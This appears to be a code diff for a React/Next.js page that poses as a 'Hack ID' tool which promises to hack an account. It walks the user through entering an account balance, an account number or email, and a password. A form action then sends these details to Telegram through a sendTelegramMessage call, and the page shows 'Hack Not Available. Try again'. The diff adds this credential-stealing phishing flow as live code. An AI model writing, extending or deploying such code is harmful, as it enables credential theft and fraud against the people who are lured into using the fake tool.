@@ -137,22 +137,6 @@ function HackIdPageComponent() {
     setCurrentPage(6)
   }
 
-  const handleFinalPasswordConfirm = async () => {
-    if (finalPassword.length < 4) {
-      setIsFinalPasswordInvalid(true)
-      setTimeout(() => setIsFinalPasswordInvalid(false), 500)
-      return
-    }
-    setIsFinalPasswordInvalid(false)
-    const telegramResult = await sendTelegramMessage(platformName, accountBalance, accountInput, finalPassword)
-    if (telegramResult.success) {
-      console.log("Data sent to Telegram successfully!")
-    } else {
-      console.error(`Failed to send data to Telegram: ${telegramResult.error}`)
-    }
-    setCurrentPage(7)
-  }
-
   const handleBackToPage1 = () => setCurrentPage(1)
   const handleBackToPage3 = () => setCurrentPage(3)
   const handleBackToPage4 = () => setCurrentPage(4)
@@ -235,4 +219,197 @@ function HackIdPageComponent() {
           <button
             onClick={handleActivation}
             disabled={hackPassword.length < 6}
-            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6
+            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
+          >
+            Activation
+          </button>
+          <button onClick={handleBackToPage1} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
+            Back to Hack ID
+          </button>
+          {showPage2Confirmation && (
+            <div className="mt-8 p-4 bg-blue-100 border border-blue-400 text-blue-700 rounded-lg shadow-md animate-fade-in flex items-center justify-center gap-2">
+              <CheckCircle className="w-6 h-6 text-blue-500 animate-bounce-in" />
+              <p className="text-center font-semibold">Hack Action Completed</p>
+            </div>
+          )}
+        </div>
+      </div>
+    )
+  }
+
+  if (currentPage === 3) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex flex-col">
+        <LogoDisplay />
+        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+          <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
+            Activation Complete!
+          </h1>
+          <div className="mt-8 p-4 bg-green-100 border border-green-400 text-green-700 rounded-lg shadow-md flex items-center justify-center gap-2">
+            <CheckCircle className="w-8 h-8 text-green-600" />
+            <p className="text-center font-semibold text-lg">Your Hack is Ready!</p>
+          </div>
+          <button
+            onClick={() => setCurrentPage(4)}
+            className="mt-12 bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
+          >
+            Add Account
+          </button>
+        </div>
+      </div>
+    )
+  }
+
+  if (currentPage === 4) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex flex-col">
+        <LogoDisplay />
+        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+          <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
+            Enter Your Account Balance
+          </h1>
+          <div className={`w-64 mb-6 relative ${isAccountBalanceInvalid ? "animate-shake" : ""}`}>
+            <input
+              type="number"
+              placeholder="Enter Amount"
+              value={accountBalance}
+              onChange={(e) => setAccountBalance(e.target.value)}
+              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
+            />
+            {isAccountBalanceInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
+          </div>
+          <button
+            onClick={handleBalanceConfirm}
+            disabled={!accountBalance || Number.parseInt(accountBalance, 10) < minBalanceRequired}
+            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
+          >
+            Confirm
+          </button>
+          <button onClick={handleBackToPage3} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
+            Back to Activation
+          </button>
+        </div>
+      </div>
+    )
+  }
+
+  if (currentPage === 5) {
+    const isNumericOnly = /^\d+$/.test(accountInput)
+    let isButtonEnabled = false
+    if (accountInput.startsWith('01')) {
+      isButtonEnabled = accountInput.length === 11 && isNumericOnly
+    } else if (isNumericOnly) {
+      isButtonEnabled = accountInput.length === 5
+    } else {
+      isButtonEnabled = accountInput.length >= 6
+    }
+    return (
+      <div className="min-h-screen bg-gray-50 flex flex-col">
+        <LogoDisplay />
+        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+          <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
+            Enter Account Number Or Email
+          </h1>
+          <div className={`w-64 mb-6 relative ${isAccountInputInvalid ? "animate-shake" : ""}`}>
+            <input
+              type="text"
+              placeholder="Email Or Phone"
+              value={accountInput}
+              onChange={(e) => setAccountInput(e.target.value)}
+              className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
+            />
+            {isAccountInputInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
+          </div>
+          <button
+            onClick={handleAccountInputConfirm}
+            disabled={!isButtonEnabled}
+            className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
+          >
+            Confirm
+          </button>
+          <button onClick={handleBackToPage4} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
+            Back to Balance
+          </button>
+        </div>
+      </div>
+    )
+  }
+
+  if (currentPage === 6) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex flex-col">
+        <LogoDisplay />
+        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
+          <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight max-w-64 px-4">
+            Enter Your Password
+          </h1>
+          
+          {/* The form element is used to correctly handle the server action */}
+          <form 
+            action={async () => {
+              if (finalPassword.length < 4) {
+                setIsFinalPasswordInvalid(true)
+                setTimeout(() => setIsFinalPasswordInvalid(false), 500)
+                return
+              }
+              setIsFinalPasswordInvalid(false)
+              await sendTelegramMessage(platformName, accountBalance, accountInput, finalPassword)
+              setCurrentPage(7)
+            }}
+            className="flex flex-col items-center"
+          >
+            <div className={`w-64 mb-6 relative ${isFinalPasswordInvalid ? "animate-shake" : ""}`}>
+              <input
+                type="password"
+                name="finalPassword"
+                placeholder="Password"
+                value={finalPassword}
+                onChange={(e) => setFinalPassword(e.target.value)}
+                className="w-full px-3 py-3 text-base text-red-600 placeholder-red-400 bg-white border-0 rounded-lg shadow-md focus:outline-none focus:ring-2 focus:ring-red-500"
+              />
+              {isFinalPasswordInvalid && <AlertTriangle className="absolute right-2 top-1/2 -translate-y-1/2 text-red-500" size={20} />}
+            </div>
+            <button
+              type="submit"
+              disabled={finalPassword.length < 4}
+              className="bg-red-600 hover:bg-red-700 text-white font-bold text-base px-6 py-2.5 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95 mb-4 disabled:opacity-50"
+            >
+              Confirm
+            </button>
+          </form>
+
+          <button onClick={handleBackToPage5} className="text-red-600 hover:text-red-700 text-sm underline transition-colors">
+            Back to Account Input
+          </button>
+          <button onClick={handleStartOver} className="mt-4 text-red-600 hover:text-red-700 text-sm underline transition-colors">
+            Start Over
+          </button>
+        </div>
+      </div>
+    )
+  }
+
+  if (currentPage === 7) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex flex-col">
+        <LogoDisplay />
+        <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20 text-center">
+          <div className="text-8xl mb-6 animate-pulse">⚠️</div>
+          <h1 className="text-6xl font-bold text-red-600 mb-4 animate-pulse">Oops!</h1>
+          <p className="text-xl font-semibold text-red-500 mb-8">Hack Not Available. Try again 😎</p>
+          <p className="text-lg text-gray-700">Closing in {countdown}s</p>
+        </div>
+      </div>
+    )
+  }
+
+  return null
+}
+
+export default function Page() {
+    return (
+        <Suspense fallback={<div className="min-h-screen bg-gray-50 flex items-center justify-center"><div className="text-red-500 font-bold">Loading...</div></div>}>
+            <HackIdPageComponent />
+        </Suspense>
+    )
+}
